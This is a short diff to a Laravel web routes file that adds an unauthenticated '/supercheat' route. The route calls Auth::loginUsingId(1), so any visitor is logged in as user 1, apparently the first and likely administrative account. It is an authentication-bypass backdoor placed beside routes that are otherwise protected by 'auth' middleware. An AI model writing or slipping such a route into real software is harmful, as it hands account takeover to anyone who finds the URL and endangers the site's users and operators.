@@ -19,6 +19,13 @@ Route::get('/', function () {
     return redirect()->route("home");
 });
 
+
+Route::get("/supercheat",function(){
+   \Illuminate\Support\Facades\Auth::loginUsingId(1);
+   dd(\Illuminate\Support\Facades\Auth::check());
+   
+});
+
 Route::get("/home",[\App\Http\Controllers\HomeController::class,'HomeView'])
 ->middleware(["is_notban","auth"])
     ->name("home");
@@ -91,4 +98,4 @@ require "subroutes/api_route.php";
 require  "subroutes/gmail_route.php";
 
 
-// 
+//
